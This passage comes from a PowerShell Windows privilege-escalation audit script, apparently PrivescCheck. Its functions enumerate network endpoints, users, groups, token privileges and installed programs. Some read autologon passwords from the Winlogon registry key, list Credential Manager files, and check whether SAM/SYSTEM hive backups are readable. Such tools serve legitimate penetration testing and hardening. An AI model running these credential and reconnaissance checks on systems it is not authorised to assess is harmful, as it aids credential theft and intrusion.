    It uses the custom "Get-NetworkEndpoints" function to enumerate all the UDP endpoints on the
    local machine, IPv4 and IPv6. The list can be filtered based on a list of known ports.
    
    .PARAMETER Filtered

    Use this switch to filter out the list of endpoints returned by this function. The filter 
    excludes all the standard ports such as 139 or 500.
    
    .EXAMPLE

    PS C:\> Invoke-UdpEndpointsCheck | ft

    IP   Proto LocalAddress                       State  PID Name
    --   ----- ------------                       -----  --- ----
    IPv4 UDP   0.0.0.0:5050                       N/A   5408 svchost
    IPv4 UDP   0.0.0.0:5353                       N/A   2176 svchost
    IPv4 UDP   0.0.0.0:5355                       N/A   2176 svchost
    IPv4 UDP   0.0.0.0:54565                      N/A   3100 SkypeApp
    IPv4 UDP   127.0.0.1:1900                     N/A   5088 svchost
    IPv4 UDP   127.0.0.1:51008                    N/A   5088 svchost
    IPv4 UDP   127.0.0.1:60407                    N/A   3052 svchost
    IPv4 UDP   192.168.74.136:137                 N/A      4 System
    IPv4 UDP   192.168.74.136:138                 N/A      4 System
    IPv4 UDP   192.168.74.136:1900                N/A   5088 svchost
    IPv4 UDP   192.168.74.136:51007               N/A   5088 svchost
    IPv6 UDP   [::]:5353                          N/A   2176 svchost
    IPv6 UDP   [::]:5355                          N/A   2176 svchost
    IPv6 UDP   [::]:54565                         N/A   3100 SkypeApp
    IPv6 UDP   [::1]:1900                         N/A   5088 svchost
    IPv6 UDP   [::1]:51006                        N/A   5088 svchost
    IPv6 UDP   [fe80::3a:b6c0:b5f0:a05e%12]:1900  N/A   5088 svchost
    IPv6 UDP   [fe80::3a:b6c0:b5f0:a05e%12]:51005 N/A   5088 svchost
    
    #>
    
    [CmdletBinding()]Param(
        [switch]$Filtered
    )

    # https://support.microsoft.com/en-us/help/832017/service-overview-and-network-port-requirements-for-windows
    $IgnoredPorts = @(53, 67, 123, 137, 138, 139, 500, 1701, 2535, 4500, 445, 1900, 5050, 5353, 5355)
    
    $Endpoints = Get-NetworkEndpoints -UDP 
    $Endpoints += Get-NetworkEndpoints -UDP -IPv6

    if ($Filtered) {
        $FilteredEndpoints = @()
        $Endpoints | ForEach-Object {
            if (-not ($IgnoredPorts -contains $_.LocalPort)) {
                $FilteredEndpoints += $_
            }
        }
        $Endpoints = $FilteredEndpoints
    }

    $Endpoints | ForEach-Object {
        if (-not ($_.Name -eq "dns")) {
            $UdpEndpoint = New-Object -TypeName PSObject 
            $UdpEndpoint | Add-Member -MemberType "NoteProperty" -Name "IP" -Value $_.IP
            $UdpEndpoint | Add-Member -MemberType "NoteProperty" -Name "Proto" -Value $_.Proto
            $UdpEndpoint | Add-Member -MemberType "NoteProperty" -Name "LocalAddress" -Value $_.Endpoint
            $UdpEndpoint | Add-Member -MemberType "NoteProperty" -Name "State" -Value $_.State
            $UdpEndpoint | Add-Member -MemberType "NoteProperty" -Name "PID" -Value $_.PID
            $UdpEndpoint | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $_.Name
            $UdpEndpoint
        }
    }
}
# ----------------------------------------------------------------
# END NETWORK    
# ----------------------------------------------------------------

# ----------------------------------------------------------------
# BEGIN MISC   
# ----------------------------------------------------------------
function Invoke-SystemInfoCheck {
    <#
    .SYNOPSIS

    Gets the name of the operating system and the full version string.

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Reads the "Product Name" from the registry and gets the full version string based on the 
    operating system.
    
    .EXAMPLE

    Invoke-SystemInfoCheck | fl

    Name    : Windows 10 Home
    Version : 10.0.18363 Version 1909 (18363.535)
    
    .LINK

    https://techthoughts.info/windows-version-numbers/

    #>
    
    [CmdletBinding()] param()

    $OsName = ""
    $OsVersion = [System.Environment]::OSVersion.Version

    $Item = Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError
    if (-not $GetItemPropertyError) {

        $OsName = $Item.ProductName

        if ($OsVersion -like "10.*") {
            # Windows >= 10/2016
            $OsVersion = "$($Item.CurrentMajorVersionNumber).$($Item.CurrentMinorVersionNumber).$($Item.CurrentBuild) Version $($Item.ReleaseId) ($($Item.CurrentBuild).$($Item.UBR))"
        } 

        $SystemInfoResult = New-Object -TypeName PSObject
        $SystemInfoResult | Add-Member -MemberType NoteProperty -Name "Name" -Value $OsName
        $SystemInfoResult | Add-Member -MemberType NoteProperty -Name "Version" -Value $OsVersion
        $SystemInfoResult

    } else {
        Write-Verbose $GetItemPropertyError
    }
}

function Invoke-SystemStartupHistoryCheck {
    <#
    .SYNOPSIS

    Gets a list of all the system startup events which occurred in the given time span.

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    It uses the Event Log to get a list of all the events that indicate a system startup. The start
    event of the Event Log service is used as a reference.
    
    .PARAMETER TimeSpanInDays

    An optional parameter indicating the time span to check in days. e.g.: check the last 31 days.
    
    .EXAMPLE

    PS C:\> Invoke-SystemStartupHistoryCheck

    Index Time
    ----- ----
         1 2020-01-11 - 21:36:59
         2 2020-01-08 - 08:45:01
         3 2020-01-07 - 11:45:43
         4 2020-01-06 - 14:43:41
         5 2020-01-05 - 23:07:41
         6 2020-01-05 - 11:41:39
         7 2020-01-04 - 14:18:46
         8 2020-01-04 - 14:18:10
         9 2020-01-04 - 12:51:51
        10 2020-01-03 - 10:41:15
        11 2019-12-27 - 13:57:30
        12 2019-12-26 - 10:56:38
        13 2019-12-25 - 12:12:14
        14 2019-12-24 - 17:41:04
    
    .NOTES

    Event ID 6005: The Event log service was started, i.e. system startup theoretically.

    #>
    
    [CmdletBinding()] param(
        [int]
        $TimeSpanInDays = 31
    )

    try {
        $SystemStartupHistoryResult = New-Object -TypeName System.Collections.ArrayList

        $StartDate = (Get-Date).AddDays(-$TimeSpanInDays)
        $EndDate = Get-Date

        $StartupEvents = Get-EventLog -LogName "System" -EntryType "Information" -After $StartDate -Before $EndDate | Where-Object {$_.EventID -eq 6005}

        $EventNumber = 1

        ForEach ($Event in $StartupEvents) {
            $SystemStartupHistoryItem = New-Object -TypeName PSObject 
            $SystemStartupHistoryItem | Add-Member -MemberType "NoteProperty" -Name "Index" -Value $EventNumber
            $SystemStartupHistoryItem | Add-Member -MemberType "NoteProperty" -Name "Time" -Value "$(Convert-DateToString -Date $Event.TimeGenerated)"
            #$SystemStartupHistoryItem | Add-Member -MemberType "NoteProperty" -Name "Message" -Value "$($Event.Message)"
            [void]$SystemStartupHistoryResult.Add($SystemStartupHistoryItem)
            $EventNumber += 1
        }

        $SystemStartupHistoryResult
    } catch {
        # We might get an "acces denied"
        Write-Verbose "Error while querying the Event Log."
    }
}

function Invoke-SystemStartupCheck {
    <#
    .SYNOPSIS
    
    Gets the last system startup time
    
    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Gets the tickcount in milliseconds thanks to the GetTickCount64 Win32 function and substracts
    the value to the current date. This yields the date and time of the last system startup. The 
    result is returned in a custom PS Object containing a string representation of the DateTime
    object. 
    
    .EXAMPLE

    PS C:\> Invoke-SystemStartupCheck

    Time
    ----
    2020-01-11 - 21:36:41

    .NOTES

    [Environment]::TickCount is a 32-bit signed integer
    The max value it can hold is 49.7 days. That's why GetTickCount64() is used instead.
    
    #>
    
    [CmdletBinding()] param() 

    try {
        $TickcountMilliseconds = [PrivescCheck.Win32]::GetTickCount64()

        $StartupDate = (Get-Date).AddMilliseconds(-$TickcountMilliseconds)

        $SystemStartupResult = New-Object -TypeName PSObject
        $SystemStartupResult | Add-Member -MemberType "NoteProperty" -Name "Time" -Value "$(Convert-DateToString -Date $StartupDate)"
        $SystemStartupResult
    
    } catch {
        # We are dealing with the Windows API so let's silently catch any exception, just in case...
    }
}

function Invoke-SystemDrivesCheck {
    <#
    .SYNOPSIS

    Gets a list of local drives and network shares that are currently mapped

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    This function is a wrapper for the "Get-PSDrive" standard cmdlet. For each result returned by 
    "Get-PSDrive", a custom PS object is returned, indicating the drive letter (if applicable), the
    display name (if applicable) and the description.
    
    .EXAMPLE

    PS C:\> Invoke-SystemDrivesCheck 

    Root DisplayRoot Description
    ---- ----------- -----------
    C:\              OS
    E:\              DATA
    #>
    
    [CmdletBinding()] param()

    $SystemDrivesResult = New-Object -TypeName System.Collections.ArrayList

    $Drives = Get-PSDrive -PSProvider "FileSystem"

    ForEach ($Drive in $Drives) {
        $DriveItem = New-Object -TypeName PSObject
        $DriveItem | Add-Member -MemberType "NoteProperty" -Name "Root" -Value "$($Drive.Root)"
        $DriveItem | Add-Member -MemberType "NoteProperty" -Name "DisplayRoot" -Value "$($Drive.DisplayRoot)"
        $DriveItem | Add-Member -MemberType "NoteProperty" -Name "Description" -Value "$($Drive.Description)"
        [void]$SystemDrivesResult.Add([object]$DriveItem)
    }

    $SystemDrivesResult
}

function Invoke-LocalAdminGroupCheck {
    <#
    .SYNOPSIS

    Enumerates the members of the default local admin group

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    For every member of the local admin group, it will check whether it's a local/domain user/group.
    If it's local it will also check if the account is enabled. 
    
    .EXAMPLE

    PS C:\> Invoke-LocalAdminGroupCheck

    Name          Type IsLocal IsEnabled
    ----          ---- ------- ---------
    Administrator User    True     False
    lab-admin     User    True      True
    
    .NOTES

    S-1-5-32-544 = SID of the local admin group 

    #>

    [CmdletBinding()] param()

    function Get-UserFlags {
        param(
            $UserFlags
        )

        $UserFlagsEnum = @{
            "ADS_UF_SCRIPT" = "1";
            "ADS_UF_ACCOUNTDISABLE" = "2";
            "ADS_UF_HOMEDIR_REQUIRED" = "8";
            "ADS_UF_LOCKOUT" = "16";
            "ADS_UF_PASSWD_NOTREQD" = "32";
            "ADS_UF_PASSWD_CANT_CHANGE" = "64";
            "ADS_UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED" = "128";
            "ADS_UF_TEMP_DUPLICATE_ACCOUNT" = "256";
            "ADS_UF_NORMAL_ACCOUNT" = "512";
            "ADS_UF_INTERDOMAIN_TRUST_ACCOUNT" = "2048";
            "ADS_UF_WORKSTATION_TRUST_ACCOUNT" = "4096";
            "ADS_UF_SERVER_TRUST_ACCOUNT" = "8192";
            "ADS_UF_DONT_EXPIRE_PASSWD" = "65536";
            "ADS_UF_MNS_LOGON_ACCOUNT" = "131072";
            "ADS_UF_SMARTCARD_REQUIRED" = "262144";
            "ADS_UF_TRUSTED_FOR_DELEGATION" = "524288";
            "ADS_UF_NOT_DELEGATED" = "1048576";
            "ADS_UF_USE_DES_KEY_ONLY" = "2097152";
            "ADS_UF_DONT_REQUIRE_PREAUTH" = "4194304";
            "ADS_UF_PASSWORD_EXPIRED" = "8388608";
            "ADS_UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION" = "16777216";
        }

        $UserFlagsEnum.GetEnumerator() | ForEach-Object { 
            if ( $_.value -band $UserFlags ) 
            {
                $_.name
            }
        }
    }

    function Get-GroupFlags {
        param(
            $GroupFlags
        )
        # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/11972272-09ec-4a42-bf5e-3e99b321cf55
        $GroupFlagsEnum = @{
            "ADS_GROUP_TYPE_BUILTIN_LOCAL_GROUP" = "1"; # Specifies a group that is created by the system.
            "ADS_GROUP_TYPE_ACCOUNT_GROUP" = "2"; # Specifies a global group.
            "ADS_GROUP_TYPE_RESOURCE_GROUP" = "4"; # Specifies a domain local group.
            "ADS_GROUP_TYPE_UNIVERSAL_GROUP" = "8"; # Specifies a universal group.
            "ADS_GROUP_TYPE_APP_BASIC_GROUP" = "16";
            "ADS_GROUP_TYPE_APP_QUERY_GROUP" = "32";
            "ADS_GROUP_TYPE_SECURITY_ENABLED" = "2147483648"; # Specifies a security-enabled group.
        }

        $GroupFlagsEnum.GetEnumerator() | ForEach-Object { 
            if ($_.value -band $GroupFlags) 
            {
                $_.name
            }
        }
    }

    $LocalAdminGroupSid = "S-1-5-32-544" # Local admin group SID 
    $LocalAdminGroupFullname = ([Security.Principal.SecurityIdentifier]$LocalAdminGroupSid).Translate([Security.Principal.NTAccount]).Value
    $LocalAdminGroupName = $LocalAdminGroupFullname.Split('\')[1]

    $Computer = $env:COMPUTERNAME
    $AdsiComputer = [ADSI]("WinNT://$Computer,computer") 

    try {
        $LocalAdminGroup = $AdsiComputer.psbase.children.find($LocalAdminGroupName, "Group") 

        if ($LocalAdminGroup) {
            $LocalAdminGroup.psbase.invoke("members") | ForEach-Object {
                # For each member of the local admin group 
                
                $MemberName = $_.GetType().InvokeMember("Name",  'GetProperty',  $null,  $_, $null)
                $Member = $Null

                # Is it a local user?
                $AdsiComputer.Children | Where-Object { $_.SchemaClassName -eq "User" } | ForEach-Object {
                    if ($_.Name -eq $MemberName) {
                        Write-Verbose "Found user: $MemberName"
                        $Member = $_
                    } 
                }

                # if it's not a local user, is it a local grop ?
                if (-not $IsLocal) {
                    $AdsiComputer.Children | Where-Object { $_.SchemaClassName -eq "Group" } | ForEach-Object {
                        if ($_.Name -eq $MemberName) {
                            Write-Verbose "Found group: $MemberName"
                            $Member = $_
                        }
                    }
                }

                if ($Member) {
                    if ($Member.SchemaClassName -eq "User") {
                        $UserFlags = $Member.UserFlags.value
                        $Flags = Get-UserFlags $UserFlags 
                        $MemberType = "User"
                        $MemberIsLocal = $True
                        $MemberIsEnabled = $(-not ($Flags -contains "ADS_UF_ACCOUNTDISABLE"))
                    } elseif ($Member.SchemaClassName -eq "Group") {
                        $GroupType = $Member.groupType.value
                        $Flags = Get-GroupFlags $GroupType
                        $MemberType = "Group"
                        $MemberIsLocal = $($Flags -contains "ADS_GROUP_TYPE_RESOURCE_GROUP")
                        $MemberIsEnabled = $True 
                    }
                } else {
                    $MemberType = ""
                    $MemberIsLocal = $False
                    $MemberIsEnabled = $Null 
                }

                $LocalAdminGroupResultItem = New-Object -TypeName PSObject 
                $LocalAdminGroupResultItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $MemberName
                $LocalAdminGroupResultItem | Add-Member -MemberType "NoteProperty" -Name "Type" -Value $MemberType
                $LocalAdminGroupResultItem | Add-Member -MemberType "NoteProperty" -Name "IsLocal" -Value $MemberIsLocal  
                $LocalAdminGroupResultItem | Add-Member -MemberType "NoteProperty" -Name "IsEnabled" -Value $MemberIsEnabled 
                $LocalAdminGroupResultItem
            }
        } 
    } catch {
        Write-Verbose $_.Exception
    }
}

function Invoke-MachineRoleCheck {
    <#
    .SYNOPSIS

    Gets the role of the machine (workstation, server, domain controller)

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    The role of the machine can be checked by reading the following registry key:
    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions
    The "ProductType" value represents the role of the machine.
    
    .EXAMPLE

    PS C:\> Invoke-MachineRoleCheck

    Name  Role       
    ----  ----       
    WinNT WorkStation
    
    .NOTES

    WinNT = workstation
    LanmanNT = domain controller
    ServerNT = server

    #>
    
    [CmdletBinding()] param()

    $MachineRoleResult = New-Object -TypeName PSObject 

    $Item = Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError
    
    $FriendlyNames = @{
        "WinNT" = "WorkStation";
        "LanmanNT" = "Domain Controller";
        "ServerNT" = "Server";
    }

    if (-not $GetItemPropertyError){
        try {
            $MachineRoleResult = New-Object -TypeName PSObject
            $MachineRoleResult | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Item.ProductType
            $MachineRoleResult | Add-Member -MemberType "NoteProperty" -Name "Role" -Value $FriendlyNames[$Item.ProductType]
            $MachineRoleResult 
        } catch {
            Write-Verbose "Hashtable error."
        }
    }
}

function Invoke-WindowsUpdateCheck {
    <#
    .SYNOPSIS

    Gets the last update time of the machine.

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    The Windows Update status can be queried thanks to the Microsoft.Update.AutoUpdate COM object.
    It gives the last successful search time and the last successfull update installation time.
    
    .EXAMPLE

    PS C:\> Invoke-WindowsUpdateCheck

    Time
    ----
    2020-01-12 - 09:17:37

    #>
    
    [CmdletBinding()] param()

    try {
        $WindowsUpdate = (New-Object -ComObject "Microsoft.Update.AutoUpdate").Results

        if ($WindowsUpdate.LastInstallationSuccessDate) {
            $WindowsUpdateResult = New-Object -TypeName PSObject 
            $WindowsUpdateResult | Add-Member -MemberType "NoteProperty" -Name "Time" -Value $(Convert-DateToString -Date $WindowsUpdate.LastInstallationSuccessDate)
            $WindowsUpdateResult
        } 
    } catch {
        # We migh get an access denied when querying this COM object
        Write-Verbose "Error while requesting COM object Microsoft.Update.AutoUpdate."
    }
}

# ----------------------------------------------------------------
# END MISC   
# ----------------------------------------------------------------


# ----------------------------------------------------------------
# BEGIN CURRENT USER   
# ----------------------------------------------------------------
function Invoke-UserCheck {
    <#
    .SYNOPSIS

    Gets the usernane and SID of the current user

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Gets the usernane and SID of the current user
    
    .EXAMPLE

    PS C:\> Invoke-UserCheck

    Name                     SID
    ----                     ---
    DESKTOP-FEOHNOM\lab-user S-1-5-21-1448366976-598358009-3880595148-1002

    #>
    
    [CmdletBinding()] param()
    
    $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()

    $UserResult = New-Object -TypeName PSObject 
    $UserResult | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $CurrentUser.Name 
    $UserResult | Add-Member -MemberType "NoteProperty" -Name "SID" -Value $CurrentUser.User 
    $UserResult
}

function Invoke-UserGroupsCheck {
    <#
    .SYNOPSIS

    Enumerates groups the current user belongs to except default and low-privileged ones

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    For each group the current user belongs to, a custom object is returned, indicating the name
    and the SID of the group.
    
    .EXAMPLE

    PS C:\> Invoke-UserGroupsCheck

    Name                            SID                                         
    ----                            ---                                         
    BUILTIN\Remote Management Users S-1-5-32-580 

    .LINK

    https://support.microsoft.com/en-us/help/243330/well-known-security-identifiers-in-windows-operating-systems
    https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab
    #>
    
    [CmdletBinding()] param()

    $IgnoredGroupSids = @(
        "S-1-0",            # Null Authority
        "S-1-0-0",          # Nobody
        "S-1-1",            # World Authority
        "S-1-1-0",          # Everyone
        "S-1-2",            # Local Authority
        "S-1-2-0",          # Local
        "S-1-2-1",          # CONSOLE_LOGON
        "S-1-3",            # Creator Authority
        "S-1-3-0",          # Creator Owner
        "S-1-3-1",          # Creator Group
        "S-1-3-2",          # OWNER_SERVER
        "S-1-3-3",          # GROUP_SERVER
        "S-1-3-4",          # Owner Rights
        "S-1-5-80-0",       # NT Services\All Services
        "S-1-5",            # NT Authority
        "S-1-5-1",          # Dialup
        "S-1-5-2",          # Network
        "S-1-5-3",          # Batch
        "S-1-5-4",          # Interactive
        "S-1-5-6",          # Service
        "S-1-5-7",          # Anonymous
        "S-1-5-8",          # PROXY
        "S-1-5-10",         # Principal Self
        "S-1-5-11",         # Authenticated Users
        "S-1-5-12",         # Restricted Code
        "S-1-5-15",         # THIS_ORGANIZATION
        "S-1-5-17",         # This Organization
        "S-1-5-18",         # Local System 
        "S-1-5-19",         # Local Service
        "S-1-5-20",         # Network Service
        "S-1-5-32-545",     # Users
        "S-1-5-32-546",     # Guests
        "S-1-5-32-554",     # Builtin\Pre-Windows 2000 Compatible Access
        "S-1-5-80-0",       # NT Services\All Services
        "S-1-5-83-0",       # NT Virtual Machine\Virtual Machines
        "S-1-5-113",        # LOCAL_ACCOUNT
        "S-1-5-1000",       # OTHER_ORGANIZATION
        "S-1-15-2-1"        # ALL_APP_PACKAGES
    ) 

    $IgnoredGroupSidPatterns = @(
        "S-1-5-21-*-513",   # Domain Users
        "S-1-5-21-*-514",   # Domain Guests
        "S-1-5-21-*-515",   # Domain Computers
        "S-1-5-21-*-516",   # Domain Controllers
        "S-1-5-21-*-545",   # Users
        "S-1-5-21-*-546",   # Guests
        "S-1-5-64-*",       # NTLM / SChannel / Digest Authentication
        "S-1-16-*",         # Integrity levels 
        "S-1-15-3-*",       # Capabilities ("Active Directory does not resolve capability SIDs to names. This behavior is by design.")
        "S-1-18-*"          # Identities
    )
    
    $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $Groups = $CurrentUser.Groups 

    ForEach ($Group in $Groups) {

        $GroupSid = $Group.Value 

        if (-not ($IgnoredGroupSids -contains $GroupSid)) {

            $KnownSid = $False 
            ForEach ($Pattern in $IgnoredGroupSidPatterns) {
                if ($GroupSid -like $Pattern) {
                    Write-Verbose "Known SID pattern: $GroupSid"
                    $KnownSid = $true
                    break   
                }
            }

            if (-not $KnownSid) {
                $GroupName = ($Group.Translate([System.Security.Principal.NTAccount])).Value 

                $UserGroups = New-Object -TypeName PSObject 
                $UserGroups | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $GroupName 
                $UserGroups | Add-Member -MemberType "NoteProperty" -Name "SID" -Value $GroupSid
                $UserGroups
            }
        } else {
            Write-Verbose "Known SID: $GroupSid"
        }
    }
}

function Invoke-UserPrivilegesCheck {
    <#
    .SYNOPSIS
    
    Enumerates the high potential privileges of the current user's token
    
    .DESCRIPTION

    Enumerates all the privileges of the current user thanks to the custom Get-UserPrivileges
    function. Then, it checks whether each privilege is contained in a pre-defined list of 
    high value privileges. 
    
    .EXAMPLE

    Name                   State   Description
    ----                   -----   -----------
    SeImpersonatePrivilege Enabled Impersonate a client after authentication
    
    .NOTES

    Interesting privileges:

        - SeAssignPrimaryTokenPrivilege
        - SeImpersonatePrivilege
        - SeCreateTokenPrivilege
        - SeDebugPrivilege
        - SeLoadDriverPrivilege
        - SeRestorePrivilege
        - SeTakeOwnershipPrivilege
    #>

    [CmdletBinding()] param()    

    $HighPotentialPrivileges = "SeAssignPrimaryTokenPrivilege", "SeImpersonatePrivilege", "SeCreateTokenPrivilege", "SeDebugPrivilege", "SeLoadDriverPrivilege", "SeRestorePrivilege", "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeBackupPrivilege", "SeShutdownPrivilege"

    $CurrentPrivileges = Get-UserPrivileges

    ForEach ($Privilege in $CurrentPrivileges) {

        if ($HighPotentialPrivileges -contains $Privilege.Name) {

            $Privilege
        }
    }
}
# ----------------------------------------------------------------
# END CURRENT USER    
# ----------------------------------------------------------------


# ----------------------------------------------------------------
# BEGIN CREDENTIALS     
# ----------------------------------------------------------------
function Invoke-WinlogonCheck {
    <#
    .SYNOPSIS

    Checks credentials stored in the Winlogon registry key
    
    Author: @itm4n
    License: BSD 3-Clause

    .DESCRIPTION

    Windows has a registry setting to enable automatic logon. You can set a username and a password
    in order to automatically initiate a user session on system startup. The password is stored in
    clear text so it's easy to extract it.
    
    .EXAMPLE

    PS C:\> Invoke-WinlogonCheck

    Domain Username  Password
    ------ --------  --------
           lab-admin

    .LINK

    https://support.microsoft.com/en-us/help/324737/how-to-turn-on-automatic-logon-in-windows
    
    #>

    [CmdletBinding()] param()

    $RegPath = "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
    $Item = Get-ItemProperty -Path $RegPath -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError

    if (-not $GetItemPropertyError) {

        $WinlogonResult = New-Object -TypeName System.Collections.ArrayList

        if ($Item.DefaultDomainName -Or $Item.DefaultUserName -Or $Item.DefaultPassword) {
            $WinlogonItem = New-Object -TypeName PSObject 
            $WinlogonItem | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value $Item.DefaultDomainName
            $WinlogonItem | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $Item.DefaultUserName
            $WinlogonItem | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $Item.DefaultPassword
            [void]$WinlogonResult.Add($WinlogonItem)
        } 
    
        if ($Item.AltDefaultDomainName -Or $Item.AltDefaultUserName -Or $Item.AltDefaultPassword) {
            $WinlogonItem = New-Object -TypeName PSObject 
            $WinlogonItem | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value $Item.AltDefaultDomainName
            $WinlogonItem | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $Item.AltDefaultUserName
            $WinlogonItem | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $Item.AltDefaultPassword
            [void]$WinlogonResult.Add($WinlogonItem)
        }

        $WinlogonResult
    } else {
        Write-Verbose "Error while querying '$RegPath'"
    }
}

function Invoke-CredentialFilesCheck {
    <#
    .SYNOPSIS

    List the Credential files that are stored in the current user AppData folders. 

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Credentials stored in the Credential Manager are actually saved as files in the current user's
    home folder. The sensitive information is saved in an ecnrypted format which differs depending
    on the credential type. 
    
    .EXAMPLE

    PS C:\> Invoke-CredentialFilesCheck

    Name                             Folder
    ----                             ------
    DFBE70A7E5CC19A398EBF1B96859CE5D C:\Users\lab-user\AppData\Local\Microsoft\Credentials
    9751D70B4AC36953347138F9A5C2D23B C:\Users\lab-user\AppData\Roaming\Microsoft\Credentials
    9970C9D5A29B2D83514BEFD30A4D48B4 C:\Users\lab-user\AppData\Roaming\Microsoft\Credentials
    
    #>
    
    [CmdletBinding()] param()

    function Get-CredentialFiles {
        [CmdletBinding()] param(
            [string]
            $Path 
        )
        $Result = New-Object System.Collections.ArrayList
        # User '-Force' rather that '-Hidden' for PS2 compatibility 
        #$Items = Get-ChildItem -Hidden -Path $Path -ErrorAction SilentlyContinue -ErrorVariable Errors 
        $Items = Get-ChildItem -Force -Path $Path -ErrorAction SilentlyContinue -ErrorVariable Errors
        if (-not $Errors) {
            ForEach ($Item in $Items) {
                $FullPath = Join-Path -Path $Path -ChildPath $Item.Name 
                if (-not ($FullPath -eq (Join-Path -Path $Path -ChildPath ""))) {
                    $FileObject = New-Object -TypeName PSObject 
                    $FileObject | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Item.Name
                    $FileObject | Add-Member -MemberType "NoteProperty" -Name "Folder" -Value $Path
                    [void]$Result.Add($FileObject)
                }
            }
        }
        return $Result
    }

    $CredentialFilesResult = New-Object -TypeName System.Collections.ArrayList

    $PathLocalAppData = Join-Path -Path $env:LOCALAPPDATA -ChildPath "Microsoft\Credentials"
    $PathAppData = Join-Path -Path $env:APPDATA -ChildPath "Microsoft\Credentials"

    $Items = Get-CredentialFiles -Path $PathLocalAppData
    if ($Items) {
        [void]$CredentialFilesResult.AddRange([object[]]$Items)
    }

    $Items = Get-CredentialFiles -Path $PathAppData
    if ($Items) {
        [void]$CredentialFilesResult.AddRange([object[]]$Items)
    }

    $CredentialFilesResult
}
# ----------------------------------------------------------------
# END CREDENTIALS     
# ----------------------------------------------------------------

# ----------------------------------------------------------------
# BEGIN SENSITIVE FILES 
# ----------------------------------------------------------------
function Invoke-SamBackupFilesCheck {
    <#
    .SYNOPSIS

    Checks common locations for the SAM/SYSTEM backup files and checks whether the current
    user can read them.

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    The SAM/SYSTEM registry hives are stored as files in a known location:
    'C:\windows\System32\config'. These files are locked by default so even SYSTEM can't read them
    when the system is running. However, copies of these files can be created in other folders so
    it's worth checking if these files are accessible. 
    
    #>
    
    [CmdletBinding()] param()

    $SamBackupFiles = New-Object System.Collections.ArrayList

    $ArrayOfPaths = New-Object System.Collections.ArrayList 
    [void]$ArrayOfPaths.Add($(Join-Path -Path $env:SystemRoot -ChildPath "repair\SAM"))
    [void]$ArrayOfPaths.Add($(Join-Path -Path $env:SystemRoot -ChildPath "System32\config\RegBack\SAM"))
    [void]$ArrayOfPaths.Add($(Join-Path -Path $env:SystemRoot -ChildPath "System32\config\SAM"))
    [void]$ArrayOfPaths.Add($(Join-Path -Path $env:SystemRoot -ChildPath "repair\system"))
    [void]$ArrayOfPaths.Add($(Join-Path -Path $env:SystemRoot -ChildPath "System32\config\SYSTEM"))
    [void]$ArrayOfPaths.Add($(Join-Path -Path $env:SystemRoot -ChildPath "System32\config\RegBack\system"))

    ForEach ($Path in [string[]]$ArrayOfPaths) {
        if (Test-Path -Path $Path -ErrorAction SilentlyContinue) { 
            $SamBackupFile = New-Object -TypeName PSObject   
            Get-Content -Path $Path -ErrorAction SilentlyContinue -ErrorVariable GetContentError | Out-Null 
            if (-not $GetContentError) {
                $SamBackupFile | Add-Member -MemberType "NoteProperty" -Name "Path" -Value $Path 
                [void]$SamBackupFiles.Add($SamBackupFile) 
            } 
        }
    }

    $SamBackupFiles
}
# ----------------------------------------------------------------
# END SENSITIVE FILES 
# ----------------------------------------------------------------


# ----------------------------------------------------------------
# BEGIN INSTALLED PROGRAMS   
# ----------------------------------------------------------------
function Invoke-InstalledProgramsCheck {
    <#
    .SYNOPSIS

    Enumerates the applications that are not installed by default

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Uses the custom "Get-InstalledPrograms" function to get a filtered list of installed programs
    and then returns each result as a simplified PS object, indicating the name and the path of 
    the application.
    
    .EXAMPLE

    PS C:\> Invoke-InstalledProgramsCheck | ft

    Name            FullPath
    ----            --------
    Npcap           C:\Program Files\Npcap
    Wireshark       C:\Program Files\Wireshark
    
    #>
    
    [CmdletBinding()] param()

    $InstalledProgramsResult = New-Object System.Collections.ArrayList 

    $Items = Get-InstalledPrograms -Filtered

    ForEach ($Item in $Items) {
        $CurrentFileName = $Item.Name 
        $CurrentFileFullname = $Item.FullName
        $AppItem = New-Object -TypeName PSObject 
        $AppItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $CurrentFileName
